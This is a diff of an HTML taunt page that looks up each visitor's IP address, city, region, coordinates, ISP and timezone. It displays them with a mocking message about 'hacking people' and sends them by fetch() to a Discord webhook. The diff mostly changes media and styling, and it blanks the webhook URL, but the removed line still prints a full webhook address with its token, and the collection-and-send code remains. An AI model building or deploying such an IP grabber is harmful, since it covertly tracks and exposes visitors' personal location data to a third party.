@@ -42,7 +42,7 @@ Bro you’re a walking L 💀"</title>
         }
         .text {
             margin-top: 5px;
-            font-size: 75px; 
+            font-size: 35px; 
             color: #ffffff; 
             text-shadow: 0 0 8px #ffffff, 0 0 15px #ffffff, 0 0 25px #ffffff; 
             letter-spacing: 4.5px;
@@ -66,31 +66,26 @@ Bro you’re a walking L 💀"</title>
 </head>
 <body>
     <div class="background-video-container">
-        <video autoplay loop muted>
-            <source src="https://cdn.discordapp.com/attachments/1316731767104864256/1364168312325537842/image.png?ex=6808b03e&is=68075ebe&hm=53d5cf16888bd2590e5fc7682f675eadc2b5a08346fea57dcbf947f3cb4df549&" type="video/mp4">
-            Your browser does not support the video tag.
-        </video>
-    </div>
+    <img src="https://cdn.discordapp.com/attachments/1316731767104864256/1364168312325537842/image.png?ex=6808b03e&is=68075ebe&hm=53d5cf16888bd2590e5fc7682f675eadc2b5a08346fea57dcbf947f3cb4df549&" 
+    style="width: 100%; height: 100%; object-fit: cover; filter: blur(15px); position: absolute; top: 0; left: 0; z-index: -1;">
+</div>
 
     <div class="gif-container">
         <img src="" alt="">
     </div>
 
-    <div id="content">
-        <div class="video-container">
-            <video autoplay loop muted>
-                <source src="https://cdn.discordapp.com/attachments/1316731767104864256/1325401957896163348/809f7f4c5f45408f9c753d45454e3d19.mov?ex=67c187c3&is=67c03643&hm=d81767855fc8751116dcd83f0746da7d6859f9a0fc805a8b9521603f5f8f910d&" type="video/mp4">
-                Your browser does not support the video tag.
-            </video>
-        </div>
+    <div class="video-container">
+    <img src="https://cdn.discordapp.com/attachments/1316731767104864256/1364168312325537842/image.png?ex=6808b03e&is=68075ebe&hm=53d5cf16888bd2590e5fc7682f675eadc2b5a08346fea57dcbf947f3cb4df549&" style="width: 400px; height: auto; border-radius: 15px; border: 2px solid #c2c2c2; box-shadow: 0 0 15px rgba(255, 255, 255, 0.7);">
+</div>
+
 
         <audio autoplay loop>
             <source src="https://cdn.discordapp.com/attachments/1316731767104864256/1325401957896163348/809f7f4c5f45408f9c753d45454e3d19.mov?ex=67c187c3&is=67c03643&hm=d81767855fc8751116dcd83f0746da7d6859f9a0fc805a8b9521603f5f8f910d&" type="audio/mpeg">
             Your browser does not support the audio element.
         </audio>
         <div class="info" id="ip-info"></div>
-        <div class="text">"You trying to hack people but can’t even protect yourself 😂
-Bro you’re a walking L 💀"</div>
+        <div class="text">"You trying to hack people but can’t even protect yourself 
+Bro you’re a walking L Abandi "</div>
     </div>
 
     <script>
@@ -108,11 +103,11 @@ Bro you’re a walking L 💀"</div>
         .then(data => {
             const { ip, country, city, region, loc, org, timezone } = data;
             const infoDiv = document.getElementById('ip-info');
-            infoDiv.innerHTML = `عنبدي الغبي
+            infoDiv.innerHTML = `
 <strong>IP:</strong><span>"${ip}"</span><br><strong>City:</strong><span>"${city}"</span><br><strong>Region:</strong><span>"${region}"</span><br><strong>Country:</strong><span>"${country}"</span><br><strong>Location:</strong><span>"${loc}"</span><br><strong></strong> <span>"${org}"</span><br><strong>Timezone:</strong><span>"${timezone}"</span>`;
 
             const dateTime = new Date().toLocaleString();
-            const webhookUrl = 'https://discord.com/api/webhooks/1344343145760161812/tLK1ujvgwghwhhW7SQgtIpMFXQiA0ivLa9jyXH3gtHKP-nrVyeazc_7H8Z2fftKsEoPR';
+            const webhookUrl = '';
             fetch(webhookUrl, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
